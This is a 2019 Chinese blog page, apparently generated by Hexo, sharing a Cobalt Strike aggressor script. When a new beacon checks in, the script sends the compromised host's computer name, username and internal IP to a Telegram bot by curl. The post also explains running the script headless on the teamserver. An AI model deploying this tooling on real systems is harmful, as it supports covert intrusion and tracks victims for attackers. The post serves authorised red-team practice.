@@ -1,0 +1,168 @@
+<!DOCTYPE HTML>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  <title>Cobalt Strike  beacon上线通知  脚本分享 | Dayu | sCRiPt n00b</title>
+
+  
+  <meta name="author" content="大宇">
+  
+
+  
+  <meta name="description" content="不如就给自己最后一次机会，奔向或许永远无法到达的理想中，死在路上。">
+  
+
+  
+  <meta name="keywords" content="dayu,大宇,大宇的博客,网络">
+  
+
+  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+
+  <meta property="og:title" content="Cobalt Strike  beacon上线通知  脚本分享">
+
+  <meta property="og:site_name" content="Dayu">
+
+  
+  <meta property="og:image" content="/favicon.ico">
+  
+
+  <link href="/favicon.ico" rel="icon">
+  <link rel="alternate" href="/atom.xml" title="Dayu" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+</head>
+
+
+<body>
+<div class="blog">
+  <div class="content">
+
+    <header>
+  <div class="site-branding">
+    <h1 class="site-title">
+      <a href="/">Dayu</a>
+    </h1>
+    <p class="site-description">sCRiPt n00b</p>
+  </div>
+  <nav class="site-navigation">
+    <ul>
+      
+        <li><a href="/">主页</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+        <li><a href="/whoami">关于</a></li>
+      
+        <li><a href="/atom.xml">订阅</a></li>
+      
+    </ul>
+  </nav>
+</header>
+
+    <main class="site-main posts-loop">
+    <article>
+
+  
+    
+    <h3 class="article-title"><span>Cobalt Strike  beacon上线通知  脚本分享</span></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/webhook-cna.html" rel="bookmark">
+        <time class="entry-date published" datetime="2019-06-13T14:30:58.000Z">
+          2019-06-13
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>Cobalt Strike应该是大家耳熟能详的工具了，它支持在客户端添加自定义的cna脚本来扩展功能。</p>
+<p>beacon上线后，我们通常想第一时间得知，以前见过msf上线后，tg通知的脚本，于是想找个cs的。</p>
+<p>我在github找到了slack的通知脚本slack-notify-beacon.cna，虽然也找到了一个telegram通知的，但是写的太麻烦，还要调用Python，于是自己改写了一个telegram-bot通知的。</p>
+<a id="more"></a>
+<h2 id="0x02-脚本"><a href="#0x02-脚本" class="headerlink" title="0x02 脚本"></a>0x02 脚本</h2><p>telegram-notify-beacon.cna</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"># author: dayu</span><br><span class="line"></span><br><span class="line"># ------------ set these config: ------------</span><br><span class="line">$bot_token = &quot;xxxxxxx&quot;;</span><br><span class="line">$chat_id = &apos;xxxxxxx&apos;;     # Write your group_id or user_id</span><br><span class="line">$teamserver_hostname = &apos;HOSTNAME-1&apos;;    # You will reveive message containing it</span><br><span class="line"># -------------------------------------------</span><br><span class="line"></span><br><span class="line">$tg_bot_webhookURL = &apos;https://api.telegram.org/bot&apos;.$bot_token.&apos;/sendMessage&apos;;</span><br><span class="line"></span><br><span class="line">$test_message = &apos;this is a test message, test success&apos;;</span><br><span class="line">@curl_command = @(&apos;curl&apos;, &apos;-X&apos;, &apos;POST&apos;, &apos;--data-urlencode&apos;, &apos;chat_id=&apos;.$chat_id, &apos;--data-urlencode&apos;, &apos;text=&apos;.$test_message, $tg_bot_webhookURL);</span><br><span class="line">exec(@curl_command);</span><br><span class="line"></span><br><span class="line">on beacon_initial &#123;</span><br><span class="line">    println(&quot;Initial Beacon Checkin: &quot; . $1 . &quot; PID: &quot; . beacon_info($1, &quot;pid&quot;));</span><br><span class="line">    local(&apos;$internalIP $computerName $userName&apos;);</span><br><span class="line">    $internalIP = replace(beacon_info($1, &quot;internal&quot;), &quot; &quot;, &quot;_&quot;);</span><br><span class="line">    $computerName = replace(beacon_info($1, &quot;computer&quot;), &quot; &quot;, &quot;_&quot;);</span><br><span class="line">    $userName = replace(beacon_info($1, &quot;user&quot;), &quot; &quot;, &quot;_&quot;);</span><br><span class="line">    $message = &apos;Message from &apos;.$teamserver_hostname.&apos; Server%0aBeacon success implant Info Target:%0aComputer name : &apos;.$computerName.&apos;%0aUsername : &apos;.$userName.&apos;%0aIpaddres : &apos;.$internalIP;</span><br><span class="line">    @curl_command = @(&apos;curl&apos;, &apos;-X&apos;, &apos;POST&apos;, &apos;--data-urlencode&apos;, &apos;chat_id=&apos;.$chat_id, &apos;--data&apos;, &apos;text=&apos;.$message, $tg_bot_webhookURL);</span><br><span class="line">    exec(@curl_command);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>需要 客户端支持curl、能够访问tg的api地址（国内访问不到）</p>
+<p>原理很简单，beacon_initial 后通过调用os的curl请求webhook，bot的申请教程可以百度，同理可以很简单的改写其他webhook，如：钉钉、Server酱等</p>
+<p>效果图：<br><img src="https://oss.dayu.ink/webhook_cna/1.png?x-oss-process=style/blog" alt></p>
+<h2 id="0x03-在teamserver上运行cna脚本"><a href="#0x03-在teamserver上运行cna脚本" class="headerlink" title="0x03 在teamserver上运行cna脚本"></a>0x03 在teamserver上运行cna脚本</h2><p>把cna脚本添加到本地客户端后，如果beacon上线了，这个webhook的通知请求 是从客户端发出的。</p>
+<p>那么问题来了，如果我要接收通知，是不是就得一直开着客户端连着teamserver？？ ？</p>
+<p>这样就非常不方便了，而且如果网络有波动，断开了到teamserver的连接，就收不到通知了。</p>
+<p>有个解决思路，在teamserver服务器上也开一个客户端，直接连到teamserver并添加cna脚本，这样就可以让teamserver服务器发出webhook通知了嘛，而且客户端也不会因为网络波动断开。</p>
+<p>由于tm服务器通常是没有桌面环境的linux系统，不能运行界面化的客户端。</p>
+<p>在微信群里SuperDong老哥的提醒下，得知可以运行无界面的客户端专门跑cna脚本，菜鸡的我表示长知识了，命令如下，agscript为cs自带的shell脚本</p>
+<p> ./agscript [host] [port] [user] [password] [/path/to/script.cna]</p>
+<h2 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h2><p><a href="https://github.com/michalkoczwara/aggressor_scripts_collection/blob/master/slack-notify-beacon.cna" target="_blank" rel="noopener">https://github.com/michalkoczwara/aggressor_scripts_collection/blob/master/slack-notify-beacon.cna</a></p>
+<p><a href="https://github.com/wahyuhadi/Pentest/blob/0a2544818281f72b409d91766f810abe512585a3/Red%20Team/cobaltsrike-notif-beacon/notif_telegram.cna" target="_blank" rel="noopener">https://github.com/wahyuhadi/Pentest/blob/0a2544818281f72b409d91766f810abe512585a3/Red%20Team/cobaltsrike-notif-beacon/notif_telegram.cna</a></p>
+
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+      
+
+    <span class="post-categories">
+      <i class="icon-categories"></i>
+        <a href="/categories/Pentest/">Pentest</a>
+    </span>
+    
+
+    
+    
+
+    <span class="post-tags">
+      <i class="icon-tags"></i>
+        <a href="/tags/Pentest/">Pentest</a>
+    </span>
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+
+    </main>
+
+    <footer class="site-footer">
+  <p class="site-info">
+    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
+    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
+    <br>
+    
+    &copy; 2019 大宇
+    
+  </p>
+</footer>
+    
+<script>
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+                (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+            m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+    ga('create', 'UA-135378097-1', 'auto');
+    ga('send', 'pageview');
+
+</script>
+
+  </div>
+</div>
+</body>
+</html>
